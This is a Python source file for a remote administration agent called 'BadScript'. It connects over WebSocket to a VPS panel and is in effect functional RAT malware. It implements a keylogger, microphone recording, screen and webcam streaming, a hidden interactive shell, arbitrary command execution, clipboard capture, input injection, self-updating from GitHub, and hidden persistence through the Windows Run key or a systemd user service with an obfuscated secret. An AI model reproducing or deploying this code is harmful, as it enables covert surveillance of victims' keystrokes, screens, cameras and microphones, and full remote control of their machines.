"""
agent.py — агент удалённого администрирования BadScript.
Подключается к VPS (Django Channels) через WebSocket и выполняет команды веб-панели.
"""

import argparse
import asyncio
import base64
import ctypes
import io
import json
import logging
import os
import platform
import shutil
import struct
import subprocess
import sys
import tempfile
import threading
import time
import urllib.request
import urllib.error
import zipfile
from pathlib import Path

IS_WINDOWS = platform.system() == "Windows"

if IS_WINDOWS:
    import winreg

import websockets

HAS_MSS = False
try:
    import mss
    HAS_MSS = True
except ImportError:
    pass

HAS_CV2 = False
try:
    import cv2
    HAS_CV2 = True
except ImportError:
    pass

HAS_PIL = False
try:
    from PIL import Image
    HAS_PIL = True
except ImportError:
    pass

HAS_KEYBOARD = False
try:
    import keyboard
    HAS_KEYBOARD = True
except ImportError:
    pass

HAS_PYNPUT = False
try:
    from pynput import keyboard as pynput_kbd
    HAS_PYNPUT = True
except Exception:
    pynput_kbd = None

HAS_AUDIO = False
try:
    import sounddevice as sd
    import numpy as np
    HAS_AUDIO = True
except ImportError:
    pass

HAS_PSUTIL = False
try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    pass

HAS_PYAUTOGUI = False
try:
    import pyautogui
    HAS_PYAUTOGUI = True
except ImportError:
    pass

from shared import CHUNK_SIZE, decrypt_msg, encrypt_msg, make_fernet

AGENT_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE_PATH = os.path.join(AGENT_DIR, "agent.log")
UPDATE_DIR = os.path.join(AGENT_DIR, "_update_cache")
GITHUB_REPO = "Pryanik-M/BadScript"
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler()],
)
log = logging.getLogger("agent")


def setup_file_logging():
    fh = logging.FileHandler(LOG_FILE_PATH, encoding="utf-8")
    fh.setLevel(logging.INFO)
    fh.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
    logging.getLogger().addHandler(fh)
    return LOG_FILE_PATH


async def _safe_send(ws, fernet, data):
    try:
        await ws.send(encrypt_msg(fernet, data))
    except Exception:
        pass


# ===================================================================
# Keylogger
# ===================================================================
if IS_WINDOWS:
    import ctypes.wintypes
    _GetForegroundWindow = ctypes.windll.user32.GetForegroundWindow
    _GetWindowThreadProcessId = ctypes.windll.user32.GetWindowThreadProcessId
    _GetKeyboardLayout = ctypes.windll.user32.GetKeyboardLayout
    _GetAsyncKeyState = ctypes.windll.user32.GetAsyncKeyState
    _GetKeyboardState = ctypes.windll.user32.GetKeyboardState
    _ToUnicodeEx = ctypes.windll.user32.ToUnicodeEx

VK_MAP = {
    0x08: '[BS]', 0x09: '[TAB]', 0x0D: '[ENTER]', 0x10: None, 0x11: None,
    0x12: None, 0x14: '[CAPS]', 0x1B: '[ESC]', 0x20: '[SPACE]',
    0x21: '[PGUP]', 0x22: '[PGDN]', 0x23: '[END]', 0x24: '[HOME]',
    0x25: '[LEFT]', 0x26: '[UP]', 0x27: '[RIGHT]', 0x28: '[DOWN]',
    0x2D: '[INS]', 0x2E: '[DEL]',
    0x70: '[F1]', 0x71: '[F2]', 0x72: '[F3]', 0x73: '[F4]',
    0x74: '[F5]', 0x75: '[F6]', 0x76: '[F7]', 0x77: '[F8]',
    0x78: '[F9]', 0x79: '[F10]', 0x7A: '[F11]', 0x7B: '[F12]',
}


class Keylogger:
    def __init__(self):
        self.running = False
        self._log = []
        self._lock = threading.Lock()
        self._listener = None
        if IS_WINDOWS:
            self._last_layout = 0
            self._update_layout()
            self._layout_timer = None

    def _update_layout(self):
        if not IS_WINDOWS:
            return
        fg = _GetForegroundWindow()
        if fg:
            fg_tid = _GetWindowThreadProcessId(fg, None)
            self._last_layout = _GetKeyboardLayout(fg_tid) if fg_tid else _GetKeyboardLayout(0)
        else:
            self._last_layout = _GetKeyboardLayout(0)
        if self.running:
            self._layout_timer = threading.Timer(0.1, self._update_layout)
            self._layout_timer.daemon = True
            self._layout_timer.start()

    def start(self):
        if self.running:
            return
        self.running = True
        self._log = []
        if HAS_PYNPUT and pynput_kbd:
            if IS_WINDOWS:
                self._update_layout()
            try:
                self._listener = pynput_kbd.Listener(on_press=self._on_key)
                self._listener.start()
            except Exception as e:
                log.warning("pynput keylog failed: %s", e)
                self.running = False
        elif HAS_KEYBOARD:
            try:
                keyboard.on_press(self._on_key_legacy)
            except Exception as e:
                log.warning("keyboard hook failed: %s", e)
                self.running = False
        else:
            self.running = False

    def stop(self):
        self.running = False
        if IS_WINDOWS and hasattr(self, '_layout_timer') and self._layout_timer:
            self._layout_timer.cancel()
        if self._listener:
            try:
                self._listener.stop()
            except Exception:
                pass
            self._listener = None
        if HAS_KEYBOARD:
            try:
                keyboard.unhook_all()
            except Exception:
                pass

    def _on_key(self, key):
        if not self.running:
            return
        entry = None
        try:
            if hasattr(key, 'char') and key.char:
                if IS_WINDOWS and hasattr(key, 'vk') and key.vk:
                    char = self._vk_to_char(key.vk)
                    entry = char if char else key.char
                else:
                    entry = key.char
            elif hasattr(key, 'vk') and key.vk:
                if key.vk in VK_MAP:
                    entry = VK_MAP[key.vk]
                elif IS_WINDOWS:
                    char = self._vk_to_char(key.vk)
                    entry = char if char else f'[{key.name}]'
            elif hasattr(key, 'name'):
                entry = f'[{key.name}]'
        except Exception:
            pass

        if entry:
            with self._lock:
                self._log.append(entry)

    def _on_key_legacy(self, event):
        if not self.running:
            return
        name = event.name
        with self._lock:
            if len(name) == 1:
                self._log.append(name)
            else:
                self._log.append(f'[{name}]')

    def _vk_to_char(self, vk):
        if not IS_WINDOWS:
            return None
        try:
            ks = (ctypes.c_ubyte * 256)()
            _GetKeyboardState(ks)
            buff = (ctypes.c_wchar * 16)()
            res = _ToUnicodeEx(vk, 0, ks, buff, 16, 0, self._last_layout)
            if res > 0:
                return buff.value
        except Exception:
            pass
        return None

    def get_log(self):
        with self._lock:
            text = "".join(self._log)
            self._log.clear()
            return text


keylogger = Keylogger()


# ===================================================================
# Audio recorder
# ===================================================================
class AudioRecorder:
    def __init__(self):
        self.is_recording = False
        self._recordings_dir = os.path.join(AGENT_DIR, "recordings")
        os.makedirs(self._recordings_dir, exist_ok=True)
        self._frames = []
        self._fs = 44100
        self._channels = 1
        self._stream = None
        self._thread = None

    def start(self, duration=None, fs=44100):
        if not HAS_AUDIO:
            return False, "sounddevice/numpy not installed"
        if self.is_recording:
            return False, "Already recording"
        self._frames = []
        self._fs = fs
        self.is_recording = True
        self._thread = threading.Thread(target=self._record_thread, args=(duration,), daemon=True)
        self._thread.start()
        return True, "Recording started"

    def stop(self):
        if not self.is_recording:
            return False, "Not recording"
        self.is_recording = False
        return True, "Recording stopped"

    def _record_thread(self, duration):
        try:
            def callback(indata, frames, time_info, status):
                if self.is_recording:
                    self._frames.append(indata.copy())

            with sd.InputStream(samplerate=self._fs, channels=self._channels, callback=callback):
                start = time.monotonic()
                while self.is_recording:
                    if duration and (time.monotonic() - start) >= duration:
                        break
                    time.sleep(0.1)

            self.is_recording = False
            if self._frames:
                data = np.concatenate(self._frames, axis=0)
                fname = os.path.join(self._recordings_dir, f"rec_{time.strftime('%Y%m%d_%H%M%S')}.wav")
                self._save_wav(fname, data, self._fs, self._channels)
                log.info("Audio saved: %s", fname)
        except Exception as e:
            log.error("Audio recording error: %s", e)
            self.is_recording = False

    def _save_wav(self, path, data, fs, channels):
        data = (data * 32767).astype(np.int16)
        ns = len(data)
        with open(path, "wb") as f:
            f.write(b"RIFF")
            f.write(struct.pack("<I", 36 + ns * 2))
            f.write(b"WAVEfmt ")
            f.write(struct.pack("<IHHIIHH", 16, 1, channels, fs, fs * channels * 2, channels * 2, 16))
            f.write(b"data")
            f.write(struct.pack("<I", ns * 2))
            f.write(data.tobytes())

    def list_recordings(self):
        res = []
        if os.path.exists(self._recordings_dir):
            for f in sorted(os.listdir(self._recordings_dir)):
                if f.endswith(".wav"):
                    p = os.path.join(self._recordings_dir, f)
                    res.append({"name": f, "size": os.path.getsize(p)})
        return res

    def get_recording(self, name):
        p = os.path.join(self._recordings_dir, name)
        if os.path.isfile(p):
            with open(p, "rb") as f:
                return f.read()
        return None

    def delete_recording(self, name):
        p = os.path.join(self._recordings_dir, name)
        if os.path.isfile(p):
            os.remove(p)
            return True
        return False


recorder = AudioRecorder()


# ===================================================================
# Screenshot & Streams
# ===================================================================
def capture_screenshot(quality=80):
    if not HAS_MSS:
        return None, "mss not installed"
    if not HAS_PIL:
        return None, "Pillow not installed"
    try:
        with mss.MSS() as sct:
            monitor = sct.monitors[0]
            sct_img = sct.grab(monitor)
        img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=quality, optimize=True)
        b64 = base64.b64encode(buf.getvalue()).decode()
        return {"image_b64": b64, "width": sct_img.width, "height": sct_img.height}, None
    except Exception as e:
        log.exception("Screenshot error")
        return None, str(e)


class ScreenStream:
    def __init__(self, ws, fernet, fps=5, quality=70):
        self.ws = ws
        self.fernet = fernet
        self.fps = fps
        self.quality = quality
        self.task = None
        self.running = False

    async def start(self):
        if not HAS_MSS or not HAS_PIL:
            await _safe_send(self.ws, self.fernet, {
                "type": "screen_frame",
                "payload": {"error": "mss or Pillow missing"},
            })
            return
        if self.running:
            return
        self.running = True
        self.task = asyncio.create_task(self._run())

    async def stop(self):
        self.running = False
        if self.task:
            self.task.cancel()
            try:
                await self.task
            except asyncio.CancelledError:
                pass
            self.task = None

    def _grab_screen_frame(self, sct, monitor):
        sct_img = sct.grab(monitor)
        img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=self.quality)
        return base64.b64encode(buf.getvalue()).decode()

    async def _run(self):
        interval = 1.0 / self.fps
        try:
            with mss.MSS() as sct:
                monitor = sct.monitors[0]
                while self.running:
                    t0 = time.monotonic()
                    b64 = await asyncio.to_thread(self._grab_screen_frame, sct, monitor)
                    await _safe_send(self.ws, self.fernet, {
                        "type": "screen_frame",
                        "payload": {"image_b64": b64},
                    })
                    dt = time.monotonic() - t0
                    sleep_time = interval - dt
                    if sleep_time > 0:
                        await asyncio.sleep(sleep_time)
        except asyncio.CancelledError:
            pass
        except Exception as e:
            log.error("Screen stream error: %s", e)


class CameraStream:
    def __init__(self, ws, fernet, camera_index=0, fps=10, quality=60):
        self.ws = ws
        self.fernet = fernet
        self.camera_index = camera_index
        self.fps = fps
        self.quality = quality
        self.task = None
        self.running = False
        self.cap = None

    async def start(self):
        if not HAS_CV2:
            await _safe_send(self.ws, self.fernet, {
                "type": "stream_frame",
                "payload": {"error": "opencv-python missing"},
            })
            return
        if self.running:
            return
        self.running = True
        self.task = asyncio.create_task(self._run())

    async def stop(self):
        self.running = False
        if self.task:
            self.task.cancel()
            try:
                await self.task
            except asyncio.CancelledError:
                pass
            self.task = None
        if self.cap:
            try:
                self.cap.release()
            except Exception:
                pass
            self.cap = None

    def _read_cam_frame(self, encode_param):
        if not self.cap or not self.cap.isOpened():
            return None
        ret, frame = self.cap.read()
        if not ret:
            return None
        ret, enc = cv2.imencode(".jpg", frame, encode_param)
        if not ret:
            return None
        return base64.b64encode(enc.tobytes()).decode()

    async def _run(self):
        try:
            self.cap = cv2.VideoCapture(self.camera_index)
            if not self.cap.isOpened():
                await _safe_send(self.ws, self.fernet, {
                    "type": "stream_frame",
                    "payload": {"error": f"Cannot open camera {self.camera_index}"},
                })
                self.running = False
                return
            interval = 1.0 / self.fps
            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), self.quality]
            while self.running:
                t0 = time.monotonic()
                b64 = await asyncio.to_thread(self._read_cam_frame, encode_param)
                if b64:
                    await _safe_send(self.ws, self.fernet, {
                        "type": "stream_frame",
                        "payload": {"image_b64": b64},
                    })
                else:
                    await asyncio.sleep(0.05)
                    continue
                dt = time.monotonic() - t0
                sleep_time = interval - dt
                if sleep_time > 0:
                    await asyncio.sleep(sleep_time)
        except asyncio.CancelledError:
            pass
        except Exception as e:
            log.error("Camera stream error: %s", e)
        finally:
            if self.cap:
                self.cap.release()
                self.cap = None


# ===================================================================
# Command execution
# ===================================================================
async def run_command(command, timeout=60):
    try:
        full_cmd = f'cmd /c "chcp 65001 >nul & {command}"' if IS_WINDOWS else command
        proc = await asyncio.create_subprocess_shell(
            full_cmd,
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            proc.kill()
            return {"stdout": "", "stderr": "Command timed out", "returncode": -1}

        for enc in ("utf-8", "cp1251", "cp866", "latin-1"):
            try:
                return {
                    "stdout": stdout.decode(enc, errors="strict").strip(),
                    "stderr": stderr.decode(enc, errors="strict").strip(),
                    "returncode": proc.returncode,
                }
            except UnicodeDecodeError:
                continue

        return {
            "stdout": stdout.decode("utf-8", errors="replace").strip(),
            "stderr": stderr.decode("utf-8", errors="replace").strip(),
            "returncode": proc.returncode,
        }
    except Exception as e:
        return {"stdout": "", "stderr": str(e), "returncode": -1}


# ===================================================================
# Interactive Shell
# ===================================================================
# ===================================================================
# Interactive Shell (PTY on Linux/Unix, unbuffered chunk-stream on Windows)
# ===================================================================
class ShellSession:
    def __init__(self, ws, fernet):
        self.ws = ws
        self.fernet = fernet
        self.proc = None
        self.master_fd = None
        self.reader_task = None
        self.is_pty = False

    async def open(self):
        if not IS_WINDOWS:
            try:
                import pty
                self.master_fd, slave_fd = pty.openpty()
                shell_cmd = os.environ.get("SHELL") or "/bin/bash"
                env = dict(os.environ)
                env["TERM"] = "xterm-256color"
                env["PAGER"] = "cat"
                self.proc = subprocess.Popen(
                    [shell_cmd, "-i"],
                    stdin=slave_fd,
                    stdout=slave_fd,
                    stderr=slave_fd,
                    preexec_fn=os.setsid,
                    close_fds=True,
                    env=env,
                )
                os.close(slave_fd)
                self.is_pty = True
                self.reader_task = asyncio.create_task(self._read_loop_pty())
                await _safe_send(self.ws, self.fernet, {"type": "shell_opened", "payload": {}})
                return
            except Exception as e:
                log.warning("PTY open failed, falling back to pipe: %s", e)

        # Windows или fallback
        shell_cmd = "cmd.exe" if IS_WINDOWS else (os.environ.get("SHELL") or "/bin/bash")
        flags = subprocess.CREATE_NO_WINDOW if IS_WINDOWS else 0
        self.proc = await asyncio.create_subprocess_exec(
            shell_cmd,
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
            creationflags=flags,
        )
        self.is_pty = False
        self.reader_task = asyncio.create_task(self._read_loop_pipe())
        await _safe_send(self.ws, self.fernet, {"type": "shell_opened", "payload": {}})

    async def write(self, data, is_raw=False):
        if self.is_pty and self.master_fd is not None:
            try:
                if is_raw:
                    payload = data.encode("utf-8", errors="replace")
                else:
                    payload = (data + "\n").encode("utf-8", errors="replace")
                os.write(self.master_fd, payload)
            except Exception as e:
                log.debug("PTY write error: %s", e)
        elif self.proc and self.proc.stdin and not self.proc.stdin.is_closing():
            try:
                if is_raw:
                    payload = data.encode("utf-8", errors="replace")
                else:
                    newline = "\r\n" if IS_WINDOWS else "\n"
                    payload = (data + newline).encode("utf-8", errors="replace")
                self.proc.stdin.write(payload)
                await self.proc.stdin.drain()
            except Exception as e:
                log.debug("Pipe write error: %s", e)

    async def close(self):
        if self.reader_task:
            self.reader_task.cancel()
            self.reader_task = None
        if self.master_fd is not None:
            try:
                os.close(self.master_fd)
            except Exception:
                pass
            self.master_fd = None
        if self.proc:
            try:
                if hasattr(self.proc, "kill"):
                    self.proc.kill()
                elif hasattr(self.proc, "terminate"):
                    self.proc.terminate()
            except Exception:
                pass
            self.proc = None
        await _safe_send(self.ws, self.fernet, {"type": "shell_closed", "payload": {}})

    def _read_pty_sync(self):
        if self.master_fd is None:
            return None
        try:
            return os.read(self.master_fd, 4096)
        except (OSError, ValueError):
            return None

    async def _read_loop_pty(self):
        loop = asyncio.get_running_loop()
        try:
            while self.master_fd is not None:
                chunk = await loop.run_in_executor(None, self._read_pty_sync)
                if not chunk:
                    break
                text = chunk.decode("utf-8", errors="replace")
                await _safe_send(self.ws, self.fernet, {
                    "type": "shell_output",
                    "payload": {"stdout": text, "stderr": ""},
                })
        except asyncio.CancelledError:
            pass
        except Exception as e:
            log.debug("PTY read loop exception: %s", e)
        finally:
            await _safe_send(self.ws, self.fernet, {"type": "shell_closed", "payload": {}})

    async def _read_loop_pipe(self):
        try:
            if self.proc and self.proc.stdout:
                while True:
                    # Читаем чанками (до 2048 байт), а не строками (readline), чтобы приглашение (prompt) появлялось сразу!
                    chunk = await self.proc.stdout.read(2048)
                    if not chunk:
                        break
                    text = None
                    for enc in ("utf-8", "cp1251", "cp866", "latin-1"):
                        try:
                            text = chunk.decode(enc, errors="strict")
                            break
                        except UnicodeDecodeError:
                            continue
                    if text is None:
                        text = chunk.decode("utf-8", errors="replace")
                    await _safe_send(self.ws, self.fernet, {
                        "type": "shell_output",
                        "payload": {"stdout": text, "stderr": ""},
                    })
        except asyncio.CancelledError:
            pass
        except Exception as e:
            log.debug("Pipe read loop error: %s", e)
        finally:
            await _safe_send(self.ws, self.fernet, {"type": "shell_closed", "payload": {}})


# ===================================================================
# File Transfer Tracker
# ===================================================================
class FileTransferTracker:
    def __init__(self):
        self.send_buffers = {}

    def resolve_path(self, remote_path):
        clean = os.path.basename(remote_path.replace("/", "\\").split("\\")[-1])
        return os.path.join(AGENT_DIR, clean)

    def accumulate(self, clean_path, data_b64, idx, total):
        if clean_path not in self.send_buffers:
            self.send_buffers[clean_path] = [None] * total
        self.send_buffers[clean_path][idx] = data_b64
        if all(c is not None for c in self.send_buffers[clean_path]):
            full_b64 = "".join(self.send_buffers[clean_path])
            del self.send_buffers[clean_path]
            return base64.b64decode(full_b64)
        return None


# ===================================================================
# System info, processes, filesystem, clipboard
# ===================================================================
def get_process_list():
    if not HAS_PSUTIL:
        return {"processes": [], "error": "psutil not installed"}
    procs = []
    for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info']):
        try:
            info = p.info
            mem_mb = round(info['memory_info'].rss / (1024 * 1024), 1) if info.get('memory_info') else 0
            procs.append({
                "pid": info['pid'],
                "name": info['name'] or "",
                "cpu": info.get('cpu_percent') or 0,
                "mem_mb": mem_mb,
            })
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    procs.sort(key=lambda x: x['cpu'], reverse=True)
    return {"processes": procs}


def kill_process(pid=None, name=None):
    if not HAS_PSUTIL:
        return {"success": False, "message": "psutil not installed"}
    killed = 0
    try:
        if pid:
            p = psutil.Process(pid)
            p.terminate()
            return {"success": True, "message": f"Killed PID {pid}"}
        elif name:
            for p in psutil.process_iter(['name']):
                if p.info['name'] and p.info['name'].lower() == name.lower():
                    p.terminate()
                    killed += 1
            return {"success": True, "message": f"Killed {killed} processes matching '{name}'"}
    except Exception as e:
        return {"success": False, "message": str(e)}
    return {"success": False, "message": "Specify PID or name"}


def get_sysinfo():
    info = {
        "hostname": platform.node(),
        "os": f"{platform.system()} {platform.release()} ({platform.version()})",
        "arch": platform.machine(),
        "python": platform.python_version(),
    }
    if HAS_PSUTIL:
        try:
            info["cpu_count"] = psutil.cpu_count(logical=True)
            info["cpu_usage_percent"] = psutil.cpu_percent(interval=0.1)
            mem = psutil.virtual_memory()
            info["ram_total_gb"] = round(mem.total / (1024**3), 2)
            info["ram_used_gb"] = round(mem.used / (1024**3), 2)
            info["ram_percent"] = mem.percent
            disks = []
            for part in psutil.disk_partitions(all=False):
                try:
                    usage = psutil.disk_usage(part.mountpoint)
                    disks.append({
                        "device": part.device,
                        "mount": part.mountpoint,
                        "total_gb": round(usage.total / (1024**3), 1),
                        "free_gb": round(usage.free / (1024**3), 1),
                        "percent": usage.percent,
                    })
                except Exception:
                    pass
            info["disks"] = disks
            info["boot_time"] = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(psutil.boot_time()))
        except Exception as e:
            info["psutil_error"] = str(e)
    return info


def fs_list(path="."):
    try:
        real_path = os.path.abspath(path)
        entries = []
        for it in os.scandir(real_path):
            try:
                st = it.stat()
                entries.append({
                    "name": it.name,
                    "is_dir": it.is_dir(),
                    "size": st.st_size if not it.is_dir() else 0,
                    "mtime": int(st.st_mtime),
                })
            except Exception:
                pass
        entries.sort(key=lambda x: (not x['is_dir'], x['name'].lower()))
        return {"path": real_path, "entries": entries}
    except Exception as e:
        return {"error": str(e)}


def get_clipboard():
    if IS_WINDOWS:
        try:
            import win32clipboard
            win32clipboard.OpenClipboard()
            try:
                data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
            except Exception:
                data = ""
            win32clipboard.CloseClipboard()
            return {"text": data}
        except Exception:
            pass
    try:
        import tkinter as tk
        r = tk.Tk()
        r.withdraw()
        txt = r.clipboard_get()
        r.destroy()
        return {"text": txt}
    except Exception as e:
        return {"text": "", "error": str(e)}


def set_clipboard(text):
    if IS_WINDOWS:
        try:
            import win32clipboard
            win32clipboard.OpenClipboard()
            win32clipboard.EmptyClipboard()
            win32clipboard.SetClipboardText(text, win32clipboard.CF_UNICODETEXT)
            win32clipboard.CloseClipboard()
            return {"success": True}
        except Exception:
            pass
    try:
        import tkinter as tk
        r = tk.Tk()
        r.withdraw()
        r.clipboard_clear()
        r.clipboard_append(text)
        r.update()
        r.destroy()
        return {"success": True}
    except Exception as e:
        return {"success": False, "error": str(e)}


# ===================================================================
# Input Simulation
# ===================================================================
def mouse_move(x, y, relative=False):
    if not HAS_PYAUTOGUI:
        return False
    if relative:
        pyautogui.moveRel(x, y)
    else:
        pyautogui.moveTo(x, y)
    return True


def mouse_click(x=None, y=None, button="left", clicks=1):
    if not HAS_PYAUTOGUI:
        return False
    pyautogui.click(x=x, y=y, button=button, clicks=clicks)
    return True


def mouse_scroll(dx=0, dy=0):
    if not HAS_PYAUTOGUI:
        return False
    if dy != 0:
        pyautogui.scroll(dy)
    if dx != 0 and hasattr(pyautogui, 'hscroll'):
        pyautogui.hscroll(dx)
    return True


def keyboard_type(text):
    if not HAS_PYAUTOGUI:
        return False
    pyautogui.typewrite(text)
    return True


def keyboard_hotkey(*keys):
    if not HAS_PYAUTOGUI:
        return False
    pyautogui.hotkey(*keys)
    return True


def keyboard_press(key):
    if not HAS_PYAUTOGUI:
        return False
    pyautogui.press(key)
    return True


# ===================================================================
# Updates & Self-restart (All bugs fixed!)
# ===================================================================
RESTART_EXIT_CODE = 42


def _restart_self():
    python_exe = sys.executable
    argv = sys.argv[:]
    quoted_argv = [f'"{a}"' if ' ' in a and not a.startswith('"') else a for a in argv]

    if IS_WINDOWS:
        try:
            bat = os.path.join(tempfile.gettempdir(), "_agent_restart.bat")
            with open(bat, "w") as f:
                f.write('@echo off\n')
                f.write('ping -n 3 127.0.0.1 >nul\n')
                f.write(f'"{python_exe}" {" ".join(quoted_argv)}\n')
                f.write('del /f /q "%~f0"\n')
            DETACHED_PROCESS = 0x00000008
            subprocess.Popen(
                f'cmd /c "{bat}"',
                stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                creationflags=DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP,
                close_fds=True,
            )
        except Exception as e:
            log.error("Windows restart failed: %s", e)
    else:
        try:
            sh = os.path.join(tempfile.gettempdir(), "_agent_restart.sh")
            with open(sh, "w") as f:
                f.write('#!/bin/sh\n')
                f.write('sleep 3\n')
                f.write(f'exec "{python_exe}" {" ".join(quoted_argv)}\n')
                f.write('rm -f "$0"\n')
            os.chmod(sh, 0o755)
            subprocess.Popen(
                [sh],
                stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                start_new_session=True,
                close_fds=True,
            )
        except Exception as e:
            log.error("Linux restart failed: %s", e)

    os._exit(RESTART_EXIT_CODE)


def apply_pending_updates():
    for f in os.listdir(AGENT_DIR):
        if f.endswith(".new"):
            src = os.path.join(AGENT_DIR, f)
            dst = src[:-4]
            try:
                shutil.copy2(src, dst)
                os.remove(src)
                log.info("Applied pending update: %s", f)
            except Exception as e:
                log.warning("Failed pending update %s: %s", f, e)


async def do_update(ws, fernet):
    try:
        await _safe_send(ws, fernet, {
            "type": "update_status",
            "payload": {"status": "starting", "message": "Проверка обновлений GitHub..."},
        })

        def fetch_release():
            api_url = f"https://api.github.com/repos/{GITHUB_REPO}/releases/latest"
            headers = {"Accept": "application/vnd.github.v3+json"}
            if GITHUB_TOKEN:
                headers["Authorization"] = f"token {GITHUB_TOKEN}"
            req = urllib.request.Request(api_url, headers=headers)
            with urllib.request.urlopen(req, timeout=10) as r:
                return json.loads(r.read().decode())

        try:
            release_data = await asyncio.to_thread(fetch_release)
            url = release_data.get("zipball_url") or f"https://github.com/{GITHUB_REPO}/archive/refs/heads/main.zip"
            version = release_data.get("tag_name", "latest")
        except Exception:
            url = f"https://github.com/{GITHUB_REPO}/archive/refs/heads/main.zip"
            version = "main"

        await _safe_send(ws, fernet, {
            "type": "update_status",
            "payload": {"status": "downloading", "message": f"Загрузка {version}..."},
        })

        os.makedirs(UPDATE_DIR, exist_ok=True)
        archive_path = os.path.join(UPDATE_DIR, "update.zip")

        def download():
            req = urllib.request.Request(url)
            with urllib.request.urlopen(req, timeout=60) as resp, open(archive_path, "wb") as f:
                while chunk := resp.read(8192):
                    f.write(chunk)

        await asyncio.to_thread(download)

        # Extract
        await _safe_send(ws, fernet, {
            "type": "update_status",
            "payload": {"status": "extracting", "message": "Распаковка архива..."},
        })
        extract_dir = os.path.join(UPDATE_DIR, "extracted")
        if os.path.exists(extract_dir):
            shutil.rmtree(extract_dir, ignore_errors=True)
        os.makedirs(extract_dir, exist_ok=True)

        with zipfile.ZipFile(archive_path, 'r') as zf:
            zf.extractall(extract_dir)

        # Handle nested root folder
        entries = os.listdir(extract_dir)
        source_dir = extract_dir
        if len(entries) == 1 and os.path.isdir(os.path.join(extract_dir, entries[0])):
            source_dir = os.path.join(extract_dir, entries[0])

        # If agent is inside an 'agent' subfolder in repo
        if os.path.isdir(os.path.join(source_dir, "agent")):
            source_dir = os.path.join(source_dir, "agent")

        # Copy files
        this_file = os.path.abspath(__file__)
        this_name = os.path.basename(this_file).lower()

        for fname in os.listdir(source_dir):
            src = os.path.join(source_dir, fname)
            if not os.path.isfile(src):
                continue
            dst = os.path.join(AGENT_DIR, fname)
            if fname.lower() == this_name or fname.lower() in ("agent.py", "server.py"):
                shutil.copy2(src, dst + ".new")
            else:
                try:
                    shutil.copy2(src, dst)
                except Exception as e:
                    log.warning("Copy error for %s: %s", fname, e)

        await _safe_send(ws, fernet, {
            "type": "update_status",
            "payload": {"status": "restarting", "message": "Обновление установлено. Перезапуск..."},
        })
        await asyncio.sleep(1)

        shutil.rmtree(UPDATE_DIR, ignore_errors=True)
        _restart_self()

    except Exception as e:
        log.exception("Update failed: %s", e)
        await _safe_send(ws, fernet, {
            "type": "update_status",
            "payload": {"status": "error", "message": str(e)},
        })


# ===================================================================
# Autostart
# ===================================================================
def _obfuscate(text):
    return f"OBF:{base64.b64encode(text.encode()).decode()[::-1]}"


def _deobfuscate(obf):
    if obf.startswith("OBF:"):
        return base64.b64decode(obf[4:][::-1]).decode()
    return obf


def install_autostart(vps_url, uid, secret):
    python_exe = sys.executable
    agent_py = os.path.abspath(__file__)
    obf_sec = _obfuscate(secret)

    if IS_WINDOWS:
        cmd = f'"{python_exe}" "{agent_py}" --vps "{vps_url}" --uid "{uid}" --secret "{obf_sec}" --hidden --watchdog'
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Run",
                               0, winreg.KEY_SET_VALUE) as k:
                winreg.SetValueEx(k, "BadScriptAgent", 0, winreg.REG_SZ, cmd)
            log.info("Autostart installed in HKCU Run")
            return True, "Автозапуск установлен в реестр Windows"
        except Exception as e:
            return False, f"Ошибка реестра: {e}"
    else:
        systemd_dir = os.path.expanduser("~/.config/systemd/user")
        os.makedirs(systemd_dir, exist_ok=True)
        content = (
            "[Unit]\nDescription=BadScript Agent\nAfter=network.target\n\n"
            f"[Service]\nExecStart={python_exe} {agent_py} --vps \"{vps_url}\" --uid \"{uid}\" --secret \"{obf_sec}\" --watchdog\n"
            f"WorkingDirectory={AGENT_DIR}\nRestart=always\nRestartSec=10\n\n"
            "[Install]\nWantedBy=default.target\n"
        )
        svc_path = os.path.join(systemd_dir, "badscript_agent.service")
        try:
            with open(svc_path, "w") as f:
                f.write(content)
            subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True)
            subprocess.run(["systemctl", "--user", "enable", "badscript_agent.service"], capture_output=True)
            return True, "Автозапуск установлен через systemd --user"
        except Exception as e:
            return False, f"systemd error: {e}"


def remove_autostart():
    if IS_WINDOWS:
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Run",
                               0, winreg.KEY_SET_VALUE) as k:
                winreg.DeleteValue(k, "BadScriptAgent")
            return True, "Автозапуск удалён из реестра"
        except FileNotFoundError:
            return True, "Запись не найдена"
        except Exception as e:
            return False, str(e)
    else:
        svc_path = os.path.expanduser("~/.config/systemd/user/badscript_agent.service")
        if os.path.exists(svc_path):
            try:
                subprocess.run(["systemctl", "--user", "stop", "badscript_agent.service"], capture_output=True)
                subprocess.run(["systemctl", "--user", "disable", "badscript_agent.service"], capture_output=True)
                os.remove(svc_path)
                subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True)
                return True, "systemd сервис удалён"
            except Exception as e:
                return False, str(e)
        return True, "Сервис не найден"


